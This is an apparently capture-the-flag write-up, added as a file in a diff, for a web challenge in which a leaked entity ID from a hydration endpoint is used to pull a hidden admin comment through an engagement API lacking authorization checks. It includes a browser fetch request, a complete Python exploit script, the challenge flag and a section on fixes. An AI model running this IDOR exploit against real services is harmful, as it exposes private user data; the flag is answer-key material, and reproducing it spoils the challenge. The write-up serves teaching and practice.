@@ -1,0 +1,208 @@
+Hidden Comment IDOR - Writeup
+
+Flag: Kaal{h1dd3n_c0mm3nt_1d0r_byp4ss_282ad848}
+
+Description
+
+A Game of Thrones themed social media site called "Kaal Media Hub - The Realm" with posts (Dispatches) and comments (Ravens). The challenge description indicated there was a hidden comment on a post with disabled comments. The goal was to find and access this hidden comment through an IDOR vulnerability.
+
+Solution
+
+Step 1: Initial Reconnaissance
+
+Upon opening the challenge URL, we encountered a medieval-themed social media platform with gold aesthetics and Game of Thrones styling. The site featured posts called "Dispatches" and comments called "Ravens," maintaining the fantasy theme throughout.
+
+We created an account by clicking "Swear Allegiance" and registering with test credentials. After logging in, the feed displayed a single post by user "victim" titled "My character design." The post showed "The ravens have been silenced," indicating that comments were disabled. No comments were visible, making this the obvious target for investigation.
+
+Step 2: Analyzing the Application Architecture
+
+We opened browser DevTools (F12) and began examining the application's structure. The Network tab revealed API calls being made, and the JavaScript source code provided insights into how the application functioned.
+
+While reading through the main page source, we discovered interesting code that dynamically loaded a script from /api/hydration. This is a common pattern in React applications where data is preloaded for better performance and to avoid additional API calls after page load.
+
+Step 3: Discovering the Hydration Endpoint
+
+We navigated directly to the hydration endpoint to see what data it exposed:
+
+http://chall-35421a42.evt-207.glabs.ctf7.com/api/hydration
+
+The response contained JavaScript code that assigned entity IDs to a global window object:
+
+window.__ENTITY_IDS__ = window.__ENTITY_IDS__ || {};
+Object.assign(window.__ENTITY_IDS__, {
+    "1": ["c0mm3nt-h1dd3n-4ee7-b337-d1sc10s3d"]
+});
+
+This was a critical information disclosure. The hydration endpoint was leaking internal entity IDs. For post ID 1 (the post with disabled comments), there was a comment ID: c0mm3nt-h1dd3n-4ee7-b337-d1sc10s3d
+
+The ID itself contained hints in leetspeak: "c0mm3nt" (comment), "h1dd3n" (hidden), and "d1sc10s3d" (disclosed). This confirmed we had found the hidden comment's identifier.
+
+Step 4: Understanding the Engagement API
+
+With the comment ID in hand, we needed to find a way to retrieve the actual comment content. We examined the JavaScript code to understand how the application handled comment interactions.
+
+The code revealed that when users click the "Honour" button to like a comment, the application sends a POST request to /api/v2/engagement with the comment ID. This endpoint was designed to handle engagement actions like liking or hearting content.
+
+Step 5: Exploiting the IDOR Vulnerability
+
+We hypothesized that the engagement endpoint might not properly validate access permissions and would return the full comment data when processing an engagement action. Using the browser console, we crafted a fetch request to test this theory:
+
+fetch('/api/v2/engagement', {
+    method: 'POST',
+    credentials: 'include',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+        action: 'heart',
+        entityType: 'Comment',
+        entityId: 'c0mm3nt-h1dd3n-4ee7-b337-d1sc10s3d'
+    })
+}).then(r => r.json()).then(console.log);
+
+The API responded with the complete comment data:
+
+{
+    "success": true,
+    "score": 1,
+    "updatedTarget": {
+        "type": "Comment",
+        "id": "c0mm3nt-h1dd3n-4ee7-b337-d1sc10s3d",
+        "body": "Admin only note: Kaal{h1dd3n_c0mm3nt_1d0r_byp4ss_282ad848}",
+        "hearts": 1
+    }
+}
+
+Success! The flag was contained in the comment body. The engagement endpoint returned the full comment object without checking whether the user should have access to it.
+
+Step 6: Understanding the Vulnerability
+
+This challenge demonstrated a classic IDOR (Insecure Direct Object Reference) vulnerability combined with information disclosure. The security failures were:
+
+1. Information Disclosure: The /api/hydration endpoint leaked internal entity IDs that should have been kept private. This gave attackers the knowledge needed to target specific hidden resources.
+
+2. Missing Access Control: The /api/v2/engagement endpoint accepted any valid comment ID and returned the full data without verifying:
+   - Whether the comment belonged to a post with disabled comments
+   - Whether the comment was marked as hidden or private
+   - Whether the requesting user had permission to view the comment
+
+3. Broken Authorization: The API assumed that if a user knew a valid ID, they were authorized to access it. This is a fundamental security flaw - obscurity is not security.
+
+In a real-world application, this vulnerability could expose private messages, admin notes, deleted content, or any hidden information to unauthorized users.
+
+Automated Exploitation Script
+
+For automation or testing purposes, here's a Python script that performs the complete exploit:
+
+import requests
+import re
+
+BASE_URL = "http://chall-35421a42.evt-207.glabs.ctf7.com"
+
+# Create session to maintain cookies
+session = requests.Session()
+
+# Step 1: Register an account
+print("[*] Registering account...")
+session.post(
+    f"{BASE_URL}/api/register",
+    json={
+        "username": "test123",
+        "password": "pass123"
+    }
+)
+
+# Step 2: Access hydration endpoint to get hidden comment ID
+print("[*] Fetching entity IDs from hydration endpoint...")
+response = session.get(f"{BASE_URL}/api/hydration")
+
+# Extract comment ID using regex
+match = re.search(r'"1":\["([^"]+)"\]', response.text)
+if not match:
+    print("[-] Failed to extract comment ID")
+    exit(1)
+
+comment_id = match.group(1)
+print(f"[+] Found hidden comment ID: {comment_id}")
+
+# Step 3: Exploit IDOR via engagement endpoint
+print("[*] Exploiting IDOR vulnerability...")
+response = session.post(
+    f"{BASE_URL}/api/v2/engagement",
+    json={
+        "action": "heart",
+        "entityType": "Comment",
+        "entityId": comment_id
+    }
+)
+
+# Extract flag from response
+data = response.json()
+if 'updatedTarget' in data and 'body' in data['updatedTarget']:
+    flag_text = data['updatedTarget']['body']
+    print(f"\n[+] SUCCESS!")
+    print(f"[+] Comment body: {flag_text}")
+    
+    # Extract just the flag
+    flag_match = re.search(r'Kaal\{[^}]+\}', flag_text)
+    if flag_match:
+        print(f"[+] Flag: {flag_match.group(0)}")
+else:
+    print("[-] Failed to retrieve comment data")
+
+Attack Chain Summary
+
+1. Registered account on Kaal Media Hub social platform
+2. Identified target post with disabled comments ("The ravens have been silenced")
+3. Opened browser DevTools to analyze application structure
+4. Discovered /api/hydration endpoint in JavaScript source code
+5. Accessed hydration endpoint directly in browser
+6. Found leaked entity ID: c0mm3nt-h1dd3n-4ee7-b337-d1sc10s3d
+7. Analyzed JavaScript to understand engagement API functionality
+8. Identified /api/v2/engagement endpoint for comment interactions
+9. Crafted POST request with hidden comment ID
+10. Exploited IDOR vulnerability to retrieve hidden comment
+11. Extracted flag from comment body: Kaal{h1dd3n_c0mm3nt_1d0r_byp4ss_282ad848}
+
+Key Techniques
+
+- Web application reconnaissance
+- JavaScript source code analysis
+- API endpoint discovery
+- Information disclosure exploitation
+- IDOR (Insecure Direct Object Reference) exploitation
+- Browser DevTools usage
+- Fetch API manipulation
+- Access control bypass
+
+Tools Used
+
+- Web browser with DevTools
+- Browser console for JavaScript execution
+- Python requests library for automation
+- Regular expressions for data extraction
+
+Security Lessons
+
+This challenge illustrates several critical web application security principles that are frequently violated in real-world applications.
+
+First, the hydration endpoint demonstrates why information disclosure matters. Even though the comment IDs weren't directly exploitable on their own, they provided the knowledge needed to target the IDOR vulnerability. Developers often assume that internal IDs are safe to expose because they're "just identifiers," but this challenge shows how they become attack vectors.
+
+Second, the engagement endpoint shows the danger of missing authorization checks. The API correctly authenticated the user (we needed to be logged in), but it failed to authorize access to specific resources. Authentication answers "who are you?" while authorization answers "what can you access?" Both are necessary for security.
+
+Third, this vulnerability demonstrates that hiding something in the UI doesn't protect it on the backend. The comment was hidden from the frontend interface, but the API still returned it to anyone who knew the ID. Security must be enforced at the API level, not just in the presentation layer.
+
+Fourth, the challenge teaches about the principle of least privilege. The engagement endpoint should only return the minimum data needed to update the UI (like the new heart count), not the entire comment object. By returning complete objects, it unnecessarily exposed sensitive data.
+
+The proper fix requires multiple changes:
+
+1. Remove or secure the hydration endpoint to prevent ID enumeration
+2. Implement proper authorization checks in the engagement endpoint
+3. Verify that users can only interact with comments they're allowed to see
+4. Check if the parent post has comments disabled before allowing engagement
+5. Return minimal data from APIs (only what's needed for the operation)
+6. Implement server-side access control that mirrors UI restrictions
+
+In penetration testing and bug bounty hunting, IDOR vulnerabilities are among the most common and impactful findings. They often lead to unauthorized access to user data, private messages, financial information, or administrative functions. This challenge provides excellent practice for identifying and exploiting these vulnerabilities in a safe, legal environment.
+
+Flag
+
+Kaal{h1dd3n_c0mm3nt_1d0r_byp4ss_282ad848}
